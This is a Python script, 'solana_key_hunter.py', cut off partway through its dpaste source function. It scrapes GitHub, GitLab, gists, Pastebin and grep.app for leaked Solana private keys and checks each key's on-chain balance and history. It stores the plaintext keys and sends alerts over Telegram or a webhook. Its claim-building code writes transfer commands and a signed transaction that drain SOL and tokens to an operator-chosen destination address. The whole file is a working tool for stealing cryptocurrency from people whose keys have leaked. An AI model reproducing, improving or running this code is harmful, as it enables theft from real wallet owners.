#!/usr/bin/env python3
"""
solana_key_hunter.py -- hunt for leaked Solana private keys, continuously.

Design notes
------------
* Extraction is multi-encoding (JSON byte arrays, base58, hex, base64, PEM)
  and every candidate is scored. Bare 32-byte blobs are penalised because
  they are indistinguishable from ordinary addresses; the same blob whose
  derived pubkey appears elsewhere in the document is strongly rewarded.
* A document is only marked processed after a clean scan, so interruptions
  and crashes retry instead of silently losing keys.
* On-chain probing is three-pronged: lamports, signature history (was it
  ever funded?) and SPL token balances (is anything left?). A drained
  wallet with history is a far stronger signal than a virgin one.
* Stored keys with priority are re-probed on a schedule and changes are
  reported, so a wallet funded after discovery is not missed.
* Nothing blocks the pipeline: writes are batched on a writer thread,
  notifications go through a queue, and concurrency is bounded.

Sources: github (code, issues, commits), gitlab, sourcegraph, grep.app,
gists, pastebin, dpaste.org.

Install:  pip install requests base58 pynacl python-dotenv
Optional: pip install solders cryptography   (claim building, PEM keys)

Run:      python solana_key_hunter.py --init-env && $EDITOR .env
          python solana_key_hunter.py -vv
"""

from __future__ import annotations

import argparse
import base64
import concurrent.futures as cf
import json
import logging
import os
import queue
import random
import re
import signal
import sqlite3
import stat
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Any, Iterator, Optional
from urllib.parse import urlparse

import base58
import requests
from nacl.signing import SigningKey
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from dotenv import load_dotenv
except ImportError:
    load_dotenv = None

try:
    import solders  # noqa: F401
    HAVE_SOLDERS = True
except ImportError:
    HAVE_SOLDERS = False

try:
    from cryptography.hazmat.primitives.serialization import load_pem_private_key
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

UA = "solana-key-hunter/2.0 (+https://venice.ai)"
MAX_TEXT = 1_200_000
B58 = "1-9A-HJ-NP-Za-km-z"
DEFAULT_RPC = "https://api.mainnet-beta.solana.com"
EXTRA_RPCS = ["https://rpc.ankr.com/solana", "https://solana.public-rpc.com"]
TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
TOKEN_2022 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
LAMPORTS_PER_SOL = 1_000_000_000

TRACE = 5
logging.addLevelName(TRACE, "TRACE")
log = logging.getLogger("hunter")

RE_VRUN = re.compile(r"^-v{2,}$")
RE_KEY64 = re.compile(rf"(?<![{B58}])[{B58}]{{86,90}}(?![{B58}])")
RE_KEY32 = re.compile(rf"(?<![{B58}])[{B58}]{{43,45}}(?![{B58}])")
RE_BRACKET = re.compile(r"\[[\s\d,]{40,900}\]")
RE_HEX64 = re.compile(r"\b(?:0x)?([0-9a-fA-F]{128})\b")
RE_HEX32 = re.compile(r"\b0x([0-9a-fA-F]{64})\b")
RE_B64 = re.compile(r"\b([A-Za-z0-9+/]{86}==)")
RE_PEM = re.compile(
    r"-----BEGIN (?:ED25519 |)PRIVATE KEY-----.*?-----END (?:ED25519 |)PRIVATE KEY-----",
    re.S)
RE_ANCHOR = re.compile(
    r"solana-keygen|phantom|solflare|from_base58_string|SecretKey::from_str|"
    r"Keypair::from|PRIVATE_KEY|private_key|privateKey|secretKey|secret_key|"
    r"KEYPAIR|keypair\.json", re.I)
RE_FILENAME_HINT = re.compile(r"(^|/)(id\.json|keypair[^/]*\.json|.*\.key|wallet[^/]*)$", re.I)

ANCHOR_WINDOW = 300


# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #
def trace(msg: str, *a: Any) -> None:
    log.log(TRACE, msg, *a)


class _ShortThread(logging.Filter):
    def filter(self, record: logging.LogRecord) -> bool:
        record.thread = (record.threadName or "-")[-10:]
        return True


def resolve_level(verbosity: int) -> int:
    if verbosity < 0:
        return logging.WARNING
    if verbosity == 0:
        return logging.INFO
    if verbosity == 1:
        return logging.DEBUG
    return TRACE


def setup_logging(verbosity: int, log_file: Optional[str]) -> int:
    level = resolve_level(verbosity)
    log.setLevel(level)
    log.propagate = False
    log.disabled = False
    fmt = logging.Formatter("%(asctime)s %(levelname)-5s [%(thread)s] %(message)s", "%H:%M:%S")
    con = logging.StreamHandler(sys.stdout)
    con.setFormatter(fmt)
    con.addFilter(_ShortThread())
    log.addHandler(con)
    if log_file:
        fh = logging.FileHandler(log_file, delay=True)
        fh.setFormatter(fmt)
        log.addHandler(fh)
    return level


# --------------------------------------------------------------------------- #
# Redaction / rate limiting / sessions
# --------------------------------------------------------------------------- #
def redact(url: str) -> str:
    p = urlparse(url)
    host = p.netloc
    if not host or host.startswith(("127.", "localhost")) or host.endswith(".local"):
        return url
    base = f"{p.scheme}://{host}{p.path}"
    return base + ("?<redacted>" if p.query else "")


class RateLimiter:
    def __init__(self, per_sec: float) -> None:
        self.interval = (1.0 / per_sec) if per_sec and per_sec > 0 else 0.0
        self._next = 0.0
        self._lock = threading.Lock()

    def wait(self) -> None:
        if not self.interval:
            return
        with self._lock:
            now = time.monotonic()
            if self._next < now:
                self._next = now
            delay = self._next - now
            self._next += self.interval
        if delay > 0:
            time.sleep(delay)


RPC_LIMITER = RateLimiter(20.0)
_local = threading.local()


def session() -> requests.Session:
    s = getattr(_local, "session", None)
    if s is None:
        s = requests.Session()
        s.headers.update({"User-Agent": UA})
        retry = Retry(
            total=3, connect=3, read=3, backoff_factor=0.8,
            status_forcelist=(500, 502, 503, 504),
            allowed_methods=frozenset(["GET", "POST"]),
            respect_retry_after_header=True, raise_on_status=False,
        )
        adapter = HTTPAdapter(max_retries=retry, pool_connections=8, pool_maxsize=16)
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        _local.session = s
    return s


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


# --------------------------------------------------------------------------- #
# Config
# --------------------------------------------------------------------------- #
class Config:
    def __init__(self, args: argparse.Namespace) -> None:
        self.args = args
        self.github_token = os.environ.get("GITHUB_TOKEN", "").strip()
        self.pastebin_key = os.environ.get("PASTEBIN_KEY", "").strip()
        self.gitlab_token = os.environ.get("GITLAB_TOKEN", "").strip()
        self.sourcegraph_token = os.environ.get("SOURCEGRAPH_TOKEN", "").strip()
        self.rpc = os.environ.get("SOLANA_RPC", DEFAULT_RPC).strip() or DEFAULT_RPC
        self.rpc_pool = [self.rpc] + [u for u in EXTRA_RPCS if u != self.rpc]
        self.telegram_token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        self.telegram_chat = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        self.webhook = os.environ.get("HUNTER_WEBHOOK", "").strip()
        self.dest = os.environ.get("HUNTER_DEST", "").strip()
        self.stop = threading.Event()

    def masked(self) -> dict[str, str]:
        return {
            "github_token": mask(self.github_token),
            "pastebin_key": mask(self.pastebin_key),
            "gitlab_token": mask(self.gitlab_token),
            "sourcegraph_token": mask(self.sourcegraph_token),
            "telegram": mask(self.telegram_token),
            "webhook": mask(self.webhook),
            "solana_rpc": redact(self.rpc),
        }


def mask(secret: str) -> str:
    if not secret:
        return "unset"
    if len(secret) <= 8:
        return "set(" + "*" * len(secret) + ")"
    return "set(" + secret[:4] + "..." + secret[-4:] + ")"


# --------------------------------------------------------------------------- #
# Store
# --------------------------------------------------------------------------- #
SCHEMA = """
CREATE TABLE IF NOT EXISTS seen_urls (
    url      TEXT PRIMARY KEY,
    status   TEXT NOT NULL DEFAULT 'pending',
    attempts INTEGER NOT NULL DEFAULT 0,
    ts       TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_seen_status ON seen_urls(status, ts);

CREATE TABLE IF NOT EXISTS keys (
    address          TEXT PRIMARY KEY,
    key_b58          TEXT NOT NULL,
    key_json         TEXT NOT NULL,
    kind             TEXT NOT NULL,
    score            INTEGER NOT NULL DEFAULT 0,
    lamports         INTEGER NOT NULL DEFAULT 0,
    exists_at        INTEGER NOT NULL DEFAULT 0,
    sig_count        INTEGER NOT NULL DEFAULT 0,
    token_count      INTEGER NOT NULL DEFAULT 0,
    tokens_json      TEXT,
    priority         INTEGER NOT NULL DEFAULT 0,
    source           TEXT,
    url              TEXT,
    first_seen       TEXT NOT NULL,
    last_checked     TEXT,
    checks           INTEGER NOT NULL DEFAULT 0,
    reported_lamports INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX IF NOT EXISTS idx_keys_recheck ON keys(priority, last_checked);
"""

MAX_ATTEMPTS = 3


class Store:
    """Single writer thread, concurrent readers."""

    def __init__(self, path: str, ttl_days: int) -> None:
        self.path = path
        self.ttl_days = ttl_days
        self.rlock = threading.Lock()
        self.wlock = threading.Lock()
        self.rconn = sqlite3.connect(path, check_same_thread=False, timeout=10)
        self.rconn.execute("PRAGMA busy_timeout=10000")
        self.wconn = sqlite3.connect(path, check_same_thread=False, timeout=10)
        self.wconn.execute("PRAGMA busy_timeout=10000")
        self.wconn.execute("PRAGMA journal_mode=WAL")
        self.wconn.executescript(SCHEMA)
        self.wconn.commit()
        self.wq: "queue.Queue[Optional[tuple]]" = queue.Queue(maxsize=2000)
        self._writer = threading.Thread(target=self._writer_loop, name="writer", daemon=True)
        self._writer.start()

    # -- reads ------------------------------------------------------------ #
    def should_skip(self, url: str) -> bool:
        with self.rlock:
            row = self.rconn.execute(
                "SELECT status, attempts FROM seen_urls WHERE url=?", (url,)).fetchone()
        if row is None:
            return False
        status, attempts = row
        if status in ("processed", "skipped"):
            return True
        return status == "failed" and attempts >= MAX_ATTEMPTS

    def has_address(self, address: str) -> bool:
        with self.rlock:
            return self.rconn.execute(
                "SELECT 1 FROM keys WHERE address=?", (address,)).fetchone() is not None

    def counts(self) -> tuple[int, int]:
        with self.rlock:
            return self.rconn.execute(
                "SELECT COUNT(*), COALESCE(SUM(lamports),0) FROM keys").fetchone()

    def due_for_recheck(self, after_seconds: int, limit: int) -> list[str]:
        cutoff = (datetime.now(timezone.utc)
                  - timedelta(seconds=after_seconds)).isoformat(timespec="seconds")
        with self.rlock:
            rows = self.rconn.execute(
                """SELECT address FROM keys
                   WHERE priority > 0 AND (last_checked IS NULL OR last_checked < ?)
                   ORDER BY last_checked IS NOT NULL, last_checked LIMIT ?""",
                (cutoff, limit)).fetchall()
        return [r[0] for r in rows]

    # -- writes ----------------------------------------------------------- #
    def _writer_loop(self) -> None:
        while True:
            batch: list[tuple] = []
            try:
                first = self.wq.get(timeout=1.0)
            except queue.Empty:
                continue
            if first is None:
                break
            batch.append(first)
            while len(batch) < 200:
                try:
                    nxt = self.wq.get_nowait()
                except queue.Empty:
                    break
                if nxt is None:
                    self.wq.put(None)
                    break
                batch.append(nxt)
            try:
                with self.wlock:
                    for op in batch:
                        self._apply(op)
                    self.wconn.commit()
            except Exception:
                log.exception("writer batch failed")

    def _apply(self, op: tuple) -> None:
        kind = op[0]
        if kind == "attempt":
            url = op[1]
            self.wconn.execute(
                """INSERT INTO seen_urls (url, status, attempts, ts)
                   VALUES (?, 'pending', 1, ?)
                   ON CONFLICT(url) DO UPDATE SET
                     status='pending', attempts=attempts+1, ts=excluded.ts""",
                (url, now_iso()))
        elif kind == "status":
            self.wconn.execute(
                "UPDATE seen_urls SET status=?, ts=? WHERE url=?", (op[2], now_iso(), op[1]))
        elif kind == "upsert":
            row = op[1]
            self.wconn.execute(
                """INSERT INTO keys (address, key_b58, key_json, kind, score, lamports,
                       exists_at, sig_count, token_count, tokens_json, priority,
                       source, url, first_seen, last_checked, checks, reported_lamports)
                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,1,?)
                   ON CONFLICT(address) DO UPDATE SET
                       lamports=excluded.lamports, exists_at=excluded.exists_at,
                       sig_count=excluded.sig_count, token_count=excluded.token_count,
                       tokens_json=excluded.tokens_json, priority=excluded.priority,
                       last_checked=excluded.last_checked, checks=checks+1""",
                row)
        elif kind == "reported":
            self.wconn.execute(
                "UPDATE keys SET reported_lamports=? WHERE address=?", (op[2], op[1]))
        elif kind == "prune":
            cutoff = (datetime.now(timezone.utc)
                      - timedelta(days=self.ttl_days)).isoformat(timespec="seconds")
            self.wconn.execute(
                "DELETE FROM seen_urls WHERE ts < ? AND status IN ('processed','skipped')",
                (cutoff,))
        elif kind == "recheck-meta":
            self.wconn.execute(
                "UPDATE keys SET last_checked=? WHERE address=?", (now_iso(), op[1]))

    def put(self, op: tuple) -> None:
        try:
            self.wq.put(op, timeout=5)
        except queue.Full:
            log.warning("write queue full, dropping %s", op[0])

    def mark_attempt(self, url: str) -> None:
        self.put(("attempt", url))

    def mark(self, url: str, status: str) -> None:
        self.put(("status", url, status))

    def close(self) -> None:
        try:
            self.wq.put(None, timeout=5)
            self._writer.join(timeout=10)
        except Exception:
            pass
        for c in (self.rconn, self.wconn):
            try:
                c.close()
            except Exception:
                pass


# --------------------------------------------------------------------------- #
# Extraction
# --------------------------------------------------------------------------- #
@dataclass
class DocContext:
    text: str
    url: str
    filename_hint: bool = False
    anchor: bool = False
    repo_hint: bool = False


@dataclass
class Candidate:
    raw: bytes
    kind: str
    offset: int
    score: int = 0
    address: Optional[str] = None
    address_match: bool = False


KIND_BASE = {
    "json-64": 45, "json-32": 20, "b58-64": 35, "b58-32": -25,
    "hex-64": 30, "hex-32": -30, "base64-64": 20, "pem": 40,
}


def _ints_from_bracket(blob: str) -> Optional[bytes]:
    nums = [int(x) for x in re.findall(r"\d{1,3}", blob)]
    if len(nums) not in (32, 64) or any(n > 255 for n in nums):
        return None
    return bytes(nums)


def extract(text: str, ctx: DocContext) -> list[Candidate]:
    out: list[Candidate] = []
    seen: set[bytes] = set()

    def add(raw: Optional[bytes], kind: str, offset: int) -> None:
        if raw is None or raw in seen or len(raw) not in (32, 64):
            return
        seen.add(raw)
        out.append(Candidate(raw=raw, kind=kind, offset=offset))

    for m in RE_BRACKET.finditer(text):
        raw = _ints_from_bracket(m.group(0))
        if raw is None:
            continue
        add(raw, "json-64" if len(raw) == 64 else "json-32", m.start())

    for m in RE_KEY64.finditer(text):
        try:
            add(base58.b58decode(m.group(0)), "b58-64", m.start())
        except Exception:
            pass

    for m in RE_KEY32.finditer(text):
        lo = max(0, m.start() - ANCHOR_WINDOW)
        if RE_ANCHOR.search(text[lo:m.start() + 80]) or ctx.filename_hint:
            try:
                add(base58.b58decode(m.group(0)), "b58-32", m.start())
            except Exception:
                pass

    for m in RE_HEX64.finditer(text):
        try:
            add(bytes.fromhex(m.group(1)), "hex-64", m.start())
        except Exception:
            pass

    for m in RE_HEX32.finditer(text):
        try:
            add(bytes.fromhex(m.group(1)), "hex-32", m.start())
        except Exception:
            pass

    for m in RE_B64.finditer(text):
        try:
            add(base64.b64decode(m.group(1), validate=True), "base64-64", m.start())
        except Exception:
            pass

    if HAVE_CRYPTO:
        for m in RE_PEM.finditer(text):
            try:
                key = load_pem_private_key(m.group(0).encode(), password=None)
                seed = key.private_bytes_raw()[:32] if hasattr(
                    key, "private_bytes_raw") else None
                if seed:
                    add(seed, "pem", m.start())
            except Exception:
                pass

    for c in out:
        c.score = KIND_BASE.get(c.kind, 0)
        if ctx.filename_hint:
            c.score += 30
        if ctx.repo_hint:
            c.score += 10
        if ctx.anchor:
            c.score += 15
    return out


def derive(cand: Candidate) -> Optional[SigningKey]:
    if len(cand.raw) == 64:
        try:
            sk = SigningKey(cand.raw[:32])
        except Exception:
            return None
        cand.address = base58.b58encode(bytes(sk.verify_key)).decode()
        if bytes(sk.verify_key) != cand.raw[32:]:
            log.debug("  pubkey half mismatch for %s", cand.address)
            cand.score -= 10
        return sk
    try:
        sk = SigningKey(cand.raw)
    except Exception:
        return None
    cand.address = base58.b58encode(bytes(sk.verify_key)).decode()
    return sk


def cross_validate(cand: Candidate, text: str) -> None:
    if not cand.address:
        return
    if text.count(cand.address) >= 1:
        cand.address_match = True
        cand.score += 45


# --------------------------------------------------------------------------- #
# RPC
# --------------------------------------------------------------------------- #
def rpc(cfg: Config, method: str, params: list, timeout: float = 15.0) -> Any:
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    last: Optional[Exception] = None
    for attempt in range(1, 5):
        if cfg.stop.is_set():
            raise RuntimeError("stopping")
        url = random.choice(cfg.rpc_pool)
        RPC_LIMITER.wait()
        t0 = time.monotonic()
        try:
            r = session().post(url, json=payload, timeout=timeout)
            dt = (time.monotonic() - t0) * 1000
            log.debug("  rpc %s -> %d %.0fms attempt=%d", method, r.status_code, dt, attempt)
            if r.status_code == 429:
                back = 2 + attempt * 3
                log.warning("  rpc 429 from %s, backoff %ss", redact(url), back)
                time.sleep(back)
                continue
            r.raise_for_status()
            body = r.json()
            if "error" in body:
                raise RuntimeError(str(body["error"]))
            return body.get("result")
        except Exception as e:
            last = e
            log.debug("  rpc %s failed attempt=%d: %s", method, attempt, e)
            time.sleep(1.0 + attempt)
    raise last or RuntimeError("rpc failed")


@dataclass
class Probe:
    lamports: int = 0
    exists: bool = False
    sig_count: int = 0
    tokens: list[dict] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)

    @property
    def token_count(self) -> int:
        return len(self.tokens)

    @property
    def priority(self) -> int:
        return 1 if (self.lamports > 0 or self.sig_count > 0 or self.tokens) else 0


def probe(cfg: Config, address: str, deep: bool = True) -> Probe:
    p = Probe()
    try:
        res = rpc(cfg, "getAccountInfo",
                  [address, {"encoding": "base64", "commitment": "confirmed"}])
        value = (res or {}).get("value")
        if value:
            p.exists = True
            p.lamports = int(value.get("lamports") or 0)
    except Exception as e:
        p.errors.append(f"accountinfo: {e}")

    if not deep:
        return p

    try:
        sigs = rpc(cfg, "getSignaturesForAddress", [address, {"limit": 5}]) or []
        p.sig_count = len(sigs)
    except Exception as e:
        p.errors.append(f"signatures: {e}")

    for program in (TOKEN_PROGRAM, TOKEN_2022):
        try:
            res = rpc(cfg, "getTokenAccountsByOwner",
                      [address, {"programId": program}, {"encoding": "jsonParsed"}])
            for acct in (res or {}).get("value") or []:
                info = acct.get("account", {}).get("data", {}).get("parsed", {}).get("info", {})
                amount = info.get("tokenAmount", {})
                if int(amount.get("amount") or 0) > 0:
                    p.tokens.append({
                        "mint": info.get("mint"),
                        "amount": amount.get("amount"),
                        "decimals": amount.get("decimals"),
                        "ui": amount.get("uiAmountString"),
                    })
        except Exception as e:
            p.errors.append(f"tokens({program[:6]}): {e}")
    return p


# --------------------------------------------------------------------------- #
# Claim building
# --------------------------------------------------------------------------- #
def build_claim(cfg: Config, address: str, key_b58: str, p: Probe) -> Optional[str]:
    dest = cfg.dest
    if not dest:
        return None
    out_dir = os.path.join(cfg.args.claim_dir, address)
    os.makedirs(out_dir, exist_ok=True)

    fee = 5000
    movable = p.lamports - fee
    lines = [f"# {address}", f"# lamports={p.lamports} tokens={p.token_count}",
             f"# rpc={redact(cfg.rpc)}", ""]
    if movable > 0:
        lines.append(
            f"solana transfer --from KEYPAIR.json {dest} {movable / LAMPORTS_PER_SOL} "
            f"--allow-unfunded-recipient --with-compute-unit-price 200000 "
            f"--url {redact(cfg.rpc)}")
    for t in p.tokens:
        lines.append(
            f"solana spl-token transfer --from KEYPAIR.json {t['mint']} "
            f"{t['ui']} {dest} --fund-recipient --url {redact(cfg.rpc)}")

    if HAVE_SOLDERS and movable > 0:
        try:
            lines += ["", "# base64 unsigned tx (SOL only):", _solders_tx(cfg, key_b58, dest, movable)]
        except Exception as e:
            lines.append(f"# solders tx failed: {e}")

    path = os.path.join(out_dir, "claim.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    return path


def _solders_tx(cfg: Config, key_b58: str, dest: str, lamports: int) -> str:
    from solders.hash import Hash
    from solders.keypair import Keypair
    from solders.message import Message
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import Transaction

    kp = Keypair.from_base58_string(key_b58)
    bh = rpc(cfg, "getLatestBlockhash", [{"commitment": "confirmed"}])["value"]["blockhash"]
    ix = transfer(TransferParams(from_pubkey=kp.pubkey(), to_pubkey=Pubkey.from_string(dest),
                                lamports=lamports))
    msg = Message.new_with_blockhash([ix], kp.pubkey(), Hash.from_string(bh))
    tx = Transaction.new_unsigned(msg)
    tx.sign([kp], Hash.from_string(bh))
    return base64.b64encode(bytes(tx)).decode()


# --------------------------------------------------------------------------- #
# Notifier
# --------------------------------------------------------------------------- #
class Notifier:
    def __init__(self, cfg: Config) -> None:
        self.cfg = cfg
        self.q: "queue.Queue[Optional[str]]" = queue.Queue(maxsize=500)
        self.thread = threading.Thread(target=self._loop, name="notify", daemon=True)
        self.thread.start()

    def send(self, text: str) -> None:
        if not (self.cfg.telegram_token or self.cfg.webhook):
            return
        try:
            self.q.put_nowait(text)
        except queue.Full:
            log.debug("notifier queue full")

    def _loop(self) -> None:
        while True:
            try:
                text = self.q.get(timeout=1)
            except queue.Empty:
                continue
            if text is None:
                break
            try:
                if self.cfg.telegram_token and self.cfg.telegram_chat:
                    session().post(
                        f"https://api.telegram.org/bot{self.cfg.telegram_token}/sendMessage",
                        json={"chat_id": self.cfg.telegram_chat, "text": text,
                              "disable_web_page_preview": True}, timeout=15)
                if self.cfg.webhook:
                    session().post(self.cfg.webhook, json={"text": text}, timeout=15)
            except Exception as e:
                log.warning("notify failed: %s", e)

    def close(self) -> None:
        try:
            self.q.put(None, timeout=3)
        except queue.Full:
            pass


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #
class Reporter:
    def __init__(self, cfg: Config) -> None:
        self.cfg = cfg
        self.lock = threading.Lock()
        self.jsonl = cfg.args.jsonl
        self.max_bytes = cfg.args.max_hit_bytes

    def _rotate(self, path: str) -> None:
        try:
            if os.path.getsize(path) > self.max_bytes:
                os.replace(path, f"{path}.{int(time.time())}")
        except OSError:
            pass

    def emit(self, address: str, key_b58: str, key_json: str, cand: Candidate,
             p: Probe, source: str, url: str) -> None:
        sol = p.lamports / LAMPORTS_PER_SOL
        interesting = p.lamports > 0 or p.tokens or p.sig_count > 0
        with self.lock:
            header = "HIT" if p.lamports > 0 else ("TOKENS" if p.tokens else
                                                   ("HISTORY" if p.sig_count else "empty"))
            print("\n" + "=" * 78)
            print(f"  {header}  score={cand.score}  kind={cand.kind}"
                  f"{'  addr-match' if cand.address_match else ''}")
            print(f"  address : {address}")
            print(f"  lamports: {p.lamports} ({sol:.9f} SOL)  exists={p.exists}")
            print(f"  history : {p.sig_count} recent sig(s)")
            if p.tokens:
                print(f"  tokens  : {len(p.tokens)}")
                for t in p.tokens[:5]:
                    print(f"            {t['ui']} of {t['mint']}")
            if p.errors:
                print(f"  errors  : {'; '.join(p.errors[:3])}")
            print(f"  key     : {key_b58}")
            print(f"  json    : {key_json}")
            print(f"  source  : {url}")
            print(f"  explorer: https://solscan.io/account/{address}")
            if interesting:
                print("=" * 78)
            sys.stdout.flush()

        if interesting:
            rec = {"ts": now_iso(), "address": address, "lamports": p.lamports,
                   "sol": sol, "sig_count": p.sig_count, "tokens": p.tokens,
                   "score": cand.score, "kind": cand.kind, "source": source,
                   "url": url, "key_b58": key_b58, "key_json": key_json}
            with self.lock:
                self._rotate(self.jsonl)
                with open(self.jsonl, "a", encoding="utf-8") as f:
                    f.write(json.dumps(rec) + "\n")
                self._rotate("hits.txt")
                with open("hits.txt", "a", encoding="utf-8") as f:
                    f.write(f"{rec['ts']}\t{sol:.9f}\t{address}\t{key_b58}\t{url}\n")

            summary = (f"{header} {sol:.9f} SOL score={cand.score} tokens={len(p.tokens)} "
                       f"sigs={p.sig_count}\n{address}\n{url}")
            self.cfg.notifier.send(summary)

            if self.cfg.args.claim_build and interesting:
                path = build_claim(self.cfg, address, key_b58, p)
                if path:
                    log.info("claim written: %s", path)


# --------------------------------------------------------------------------- #
# Sources
# --------------------------------------------------------------------------- #
Yielded = tuple[str, str, dict, Optional[str]]


def _gh_headers(cfg: Config) -> dict[str, str]:
    h = {"Accept": "application/vnd.github+json"}
    if cfg.github_token:
        h["Authorization"] = f"Bearer {cfg.github_token}"
    return h


def src_github(cfg: Config, deadline: float) -> Iterator[Yielded]:
    queries = list(GITHUB_QUERIES)
    if cfg.args.queries_file:
        with open(cfg.args.queries_file, encoding="utf-8") as f:
            queries += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    random.shuffle(queries)
    headers = _gh_headers(cfg)

    for q in queries[: cfg.args.queries_per_cycle]:
        if time.monotonic() > deadline:
            return
        days = random.randint(0, max(0, cfg.args.fresh_days))
        cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).strftime("%Y-%m-%d")
        query = f"{q} pushed:>{cutoff}"
        log.info("[github] query %r", query)

        for page in range(1, cfg.args.pages + 1):
            if time.monotonic() > deadline:
                return
            try:
                r = session().get("https://api.github.com/search/code",
                                  params={"q": query, "per_page": 100, "page": page,
                                          "sort": "indexed", "order": "desc"},
                                  headers=headers, timeout=25)
            except Exception as e:
                log.error("[github] transport: %s", e)
                break
            log.debug("[github] page %d -> %d (remaining=%s)", page, r.status_code,
                      r.headers.get("X-RateLimit-Remaining", "?"))
            if r.status_code in (403, 429):
                wait = _rate_wait(r)
                log.warning("[github] rate limited, sleep %ss", wait)
                time.sleep(wait)
                continue
            if r.status_code != 200:
                log.error("[github] %d: %s", r.status_code, r.text[:160])
                break
            body = r.json()
            items = body.get("items", [])
            log.info("[github] page %d: %d items (total=%s)", page, len(items),
                     body.get("total_count"))
            if not items:
                break
            for it in items:
                repo = it.get("repository", {}).get("full_name")
                path, sha = it.get("path"), it.get("sha")
                if not repo or not path:
                    continue
                yield (f"https://raw.githubusercontent.com/{repo}/{sha}/{path}",
                       "github", {}, None)
            time.sleep(cfg.args.github_delay)

    # issue and commit bodies, inline
    for endpoint, label in (("issues", "gh-issue"), ("commits", "gh-commit")):
        if time.monotonic() > deadline:
            return
        try:
            r = session().get(f"https://api.github.com/search/{endpoint}",
                              params={"q": f'solana "{GITHUB_KEY_MARKER}"', "per_page": 50},
                              headers=headers, timeout=25)
        except Exception as e:
            log.error("[%s] transport: %s", label, e)
            continue
        if r.status_code != 200:
            log.debug("[%s] %d", label, r.status_code)
            continue
        for it in r.json().get("items", []):
            text = it.get("body") if endpoint == "issues" else it.get("commit", {}).get("message")
            link = it.get("html_url") or it.get("url") or f"{label}://inline"
            if text:
                yield link, label, {}, text
        time.sleep(cfg.args.github_delay)


GITHUB_KEY_MARKER = "keypair"


def _rate_wait(r: requests.Response) -> int:
    reset = r.headers.get("X-RateLimit-Reset")
    if reset:
        try:
            return max(5, min(120, int(reset) - int(time.time()) + 2))
        except ValueError:
            pass
    return 30


def src_gists(cfg: Config, deadline: float) -> Iterator[Yielded]:
    since = (datetime.now(timezone.utc) - timedelta(days=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
    headers = _gh_headers(cfg)
    for page in range(1, 4):
        if time.monotonic() > deadline:
            return
        try:
            r = session().get("https://api.github.com/gists/public",
                              params={"per_page": 100, "page": page, "since": since},
                              headers=headers, timeout=25)
        except Exception as e:
            log.error("[gists] transport: %s", e)
            return
        if r.status_code != 200:
            log.error("[gists] %d", r.status_code)
            return
        batch = r.json()
        log.info("[gists] page %d: %d", page, len(batch))
        if not batch:
            return
        for g in batch:
            for meta in (g.get("files") or {}).values():
                raw = meta.get("raw_url")
                if raw:
                    yield raw, "gist", {}, None
        time.sleep(1.0)


def src_gitlab(cfg: Config, deadline: float) -> Iterator[Yielded]:
    if not cfg.gitlab_token:
        log.debug("[gitlab] no GITLAB_TOKEN, skipping")
        return
    headers = {"PRIVATE-TOKEN": cfg.gitlab_token}
    for term in ("solana keypair", "solana privateKey"):
        if time.monotonic() > deadline:
            return
        try:
            r = session().get("https://gitlab.com/api/v4/search",
                              params={"scope": "blobs", "search": term, "per_page": 100},
                              headers=headers, timeout=25)
        except Exception as e:
            log.error("[gitlab] transport: %s", e)
            return
        if r.status_code != 200:
            log.error("[gitlab] %d", r.status_code)
            return
        for blob in r.json():
            data = blob.get("data") or ""
            link = f"gitlab://{blob.get('project_id')}/{blob.get('path')}"
            if data:
                yield link, "gitlab", {}, data
        time.sleep(2.0)


def src_grepapp(cfg: Config, deadline: float) -> Iterator[Yielded]:
    for pattern in (r"\"privateKey\"\s*:\s*\"[1-9A-HJ-NP-Za-km-z]{80,90}\"",
                    r"solana-keygen"):
        if time.monotonic() > deadline:
            return
        try:
            r = session().get("https://grep.app/api/search",
                              params={"q": pattern, "regexp": "true"}, timeout=25)
        except Exception as e:
            log.error("[grepapp] transport: %s", e)
            return
        if r.status_code != 200:
            log.debug("[grepapp] %d", r.status_code)
            return
        try:
            hits = r.json().get("hits", {}).get("hits", [])
        except Exception:
            return
        log.info("[grepapp] %d hits for %r", len(hits), pattern)
        for h in hits:
            snippet = (h.get("content", {}) or {}).get("snippet") or ""
            repo = (h.get("repo", {}) or {}).get("raw") or "?"
            path = (h.get("path", {}) or {}).get("raw") or "?"
            if snippet:
                yield f"grepapp://{repo}/{path}", "grepapp", {}, snippet
        time.sleep(2.0)


def src_pastebin(cfg: Config, deadline: float) -> Iterator[Yielded]:
    url = "https://scrape.pastebin.com/api_scraping.php?limit=100"
    if cfg.pastebin_key:
        url += f"&api_dev_key={cfg.pastebin_key}"
    try:
        r = session().get(url, timeout=25)
    except Exception as e:
        log.error("[pastebin] transport: %s", e)
        return
    if r.status_code != 200:
        log.error("[pastebin] %d", r.status_code)
        return
    try:
        items = r.json()
    except Exception:
        log.error("[pastebin] non-JSON, IP likely not whitelisted")
        return
    log.info("[pastebin] %d pastes", len(items or []))
    for it in items or []:
        if time.monotonic() > deadline:
            return
        key = it.get("key")
        if key:
            yield f"https://pastebin.com/raw/{key}", "pastebin", {}, None


def src_dpaste(cfg: Config, deadline: float) -> Iterator[Yielded]:
    try:
        r = session().get("https://dpaste.org/api/recent/?limit=50", timeout=20)
        if r.status_code != 200:
            return
        items = r.json()
